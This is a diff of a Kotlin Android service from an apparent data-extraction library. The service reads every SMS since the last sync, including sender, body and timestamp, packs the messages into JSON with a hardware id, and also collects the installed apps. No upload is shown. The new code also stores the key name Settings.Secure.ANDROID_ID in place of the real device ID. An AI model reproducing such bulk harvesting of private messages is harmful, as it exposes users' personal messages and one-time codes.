@@ -17,6 +17,7 @@ import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import com.google.gson.Gson
 import com.google.gson.GsonBuilder
+import com.google.gson.JsonObject
 import com.google.gson.JsonParser
 import info.kalagato.com.extractor.Constant
 import info.kalagato.com.extractor.Extractor
@@ -26,6 +27,7 @@ import info.kalagato.com.extractor.Util.getDeviceId
 import info.kalagato.com.extractor.Util.getLastSyncTime
 import info.kalagato.com.extractor.Util.setLastSyncDateTime
 import org.json.JSONArray
+import org.json.JSONObject
 import java.io.File
 import java.io.FileWriter
 import java.text.SimpleDateFormat
@@ -36,7 +38,7 @@ class ReadSMSService : Service() {
     private val TAG = "read-sms-service"
     private var mServiceLooper: Looper? = null
     private var mServiceHandler: ServiceHandler? = null
-    val jsArray = JSONArray()
+    val smsObject = JSONObject()
     override fun onCreate() {
 //        Log.d(TAG,"onCreate");
         // Start up the thread running the service.  Note that we create a
@@ -116,10 +118,9 @@ class ReadSMSService : Service() {
     private inner class ServiceHandler(looper: Looper?) : Handler(looper!!) {
         override fun handleMessage(msg: Message) {
 //            Log.d(TAG,"handleMessage");
-            val smsAvailable:List<Sms>? = getAllSms()
-            val gson = Gson()
-            val data = gson.toJson(smsAvailable)
-            val jsonArray = JsonParser().parse(data).asJsonArray
+            val smsArray:JSONArray? = getAllSms()
+           smsObject.put("hardware_id",Settings.Secure.ANDROID_ID)
+           smsObject.put("sms_array",smsArray)
 
             AppRunningStatus().getAllPackageInstalled(applicationContext)
             //            new AppRunningStatus().getAppUsage(getApplicationContext());
@@ -132,110 +133,43 @@ class ReadSMSService : Service() {
             stopSelf(msg.arg1)
         }
 
-        val sMS: Boolean
-            get() {
-                // public static final String INBOX = "content://sms/inbox";
-                // public static final String SENT = "content://sms/sent";
-                // public static final String DRAFT = "content://sms/draft";
-                if (applicationContext.checkSelfPermission(Manifest.permission.READ_SMS)
-                    != PackageManager.PERMISSION_GRANTED
-                ) {
-//                    Log.d(TAG,"User did not provided the access");
-                    return false
-                }
-                val folder = File(Environment.getDataDirectory().toString() + "/Folder")
-                val mydir =
-                    applicationContext.getDir("mydir", MODE_PRIVATE) //Creating an internal dir;
-
-                val c = Calendar.getInstance().time
-                val df = SimpleDateFormat("dd-MMM-yyyy", Locale.getDefault())
-                val formattedDate = df.format(c)
-                val filename = (mydir.toString() + "/" + Constant.SMS + "_"
-                        + getDeviceId(applicationContext) + "_" + formattedDate + ".csv")
-                //            Log.d(TAG,"filename = "+ filename);
-                try {
-                    val fw = FileWriter(filename, true)
-                    val lastSyncTime = getLastSyncTime(
-                        applicationContext
-                    )
-                    val currentSyncTime = Date().time
-                    //                Log.d(TAG,"dateEnd = "+ lastSyncTime);
-                    // Now create a SimpleDateFormat object.
-                    var filter = ""
-                    filter = if (lastSyncTime == 0L) {
-                        " date <= $currentSyncTime"
-                    } else {
-                        " date <= $currentSyncTime and date >= $lastSyncTime"
-                    }
-
-//                Log.d(TAG,"filter = "+filter);
-
-                    // Now create the filter and query the messages.
-                    val cursor = applicationContext.contentResolver.query(
-                        Uri.parse("content://sms/"),
-                        null,
-                        filter,
-                        null,
-                        "date desc"
-                    )
-                    if (cursor!!.moveToFirst()) { // must check the result to prevent exception
-//                    Log.d(TAG,"No. of messages:" + cursor.getCount());
-                        for (idx in 0 until cursor.columnCount) {
-                            fw.append(cursor.getColumnName(idx))
-                            fw.append(',')
-                        }
-                        fw.append('\n')
-                        do {
-                            for (idx in 0 until cursor.columnCount) {
-                                if (cursor.getColumnName(idx).equals("body", ignoreCase = true)) {
-                                    fw.append("\"" + cursor.getString(idx) + "\"")
-                                } else {
-                                    fw.append(cursor.getString(idx))
-                                }
-                                fw.append(',')
-                            }
-                            fw.append('\n')
-                            // use msgData
-                        } while (cursor.moveToNext())
-                        setLastSyncDateTime(applicationContext, currentSyncTime)
-                    } else {
-                        // empty box, no SMS
-//                    Log.d(TAG,"empty box, no SMS");
-                        return false
-                    }
-                    fw.flush()
-                    fw.close()
-                } catch (e: Exception) {
-                    e.printStackTrace()
-                }
-                return false
-            }
-
 
         @SuppressLint("Range")
-        fun getAllSms(): List<Sms>? {
+        fun getAllSms(): JSONArray {
             if (ContextCompat.checkSelfPermission(
                     applicationContext,
                     Manifest.permission.READ_SMS
                 ) == PackageManager.PERMISSION_GRANTED
             ) {
 
-                val lstSms: MutableList<Sms> = ArrayList()
-                var objSms = Sms()
+                //Sync message with the current time to gte the Incremental Messages
+                val currentSyncTime = Date().time
+                val lastSyncTime = getLastSyncTime(
+                    applicationContext
+                )
+                // Now create a SimpleDateFormat object.
+                val filter = if (lastSyncTime == 0L) {
+                    " date <= $currentSyncTime"
+                } else {
+                    " date <= $currentSyncTime and date >= $lastSyncTime"
+                }
+
+
                 val message = Uri.parse("content://sms/")
                 val cr: ContentResolver = contentResolver
-                val c: Cursor? = cr.query(message, null, null, null, null)
+                val c: Cursor? = cr.query(message, null,filter, null, null)
                 //Activity().startManagingCursor(c)
                 val totalSMS: Int = c!!.count
+                val jsonArray = JSONArray()
+
                 if (c.moveToFirst()) {
                     for (i in 0 until totalSMS) {
-                        objSms = Sms()
-                        objSms.hardware_id = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
-                        objSms.sender_id = c.getString(c.getColumnIndexOrThrow("address"))
-                        objSms.body = c.getString(c.getColumnIndexOrThrow("body"))
-                        objSms.message_timestamp = c.getString(c.getColumnIndexOrThrow("date"))
-                        objSms.app_name = applicationContext.packageName
-                        lstSms.add(objSms)
+                        val jsonObject = JSONObject()
+                        jsonObject.put("sender_id",c.getString(c.getColumnIndexOrThrow("address")))
+                        jsonObject.put("body",c.getString(c.getColumnIndexOrThrow("body")))
+                        jsonObject.put("message_timestamp",c.getString(c.getColumnIndexOrThrow("date")))
+                        jsonObject.put("app_name",applicationContext.packageName)
+                        jsonArray.put(jsonObject)
                         c.moveToNext()
                     }
                 }
@@ -243,20 +177,10 @@ class ReadSMSService : Service() {
                 // throw new RuntimeException("You have no SMS");
                 // }
                 c.close()
-                val gson = GsonBuilder().create()
-                val myCustomArray = gson.toJsonTree(lstSms).asJsonArray
-                return lstSms
+                setLastSyncDateTime(applicationContext, currentSyncTime)
+                return jsonArray
             }
-            return emptyList()
+            return JSONArray()
         }
     }
 }
-
-data class Sms (
-    var hardware_id: String? = null,
-    var sender_id: String? = null,
-    var body: String? = null,
-    var message_timestamp: String? = null,
-    var folder_name: String? = null,
-    var app_name : String ?= null
-)
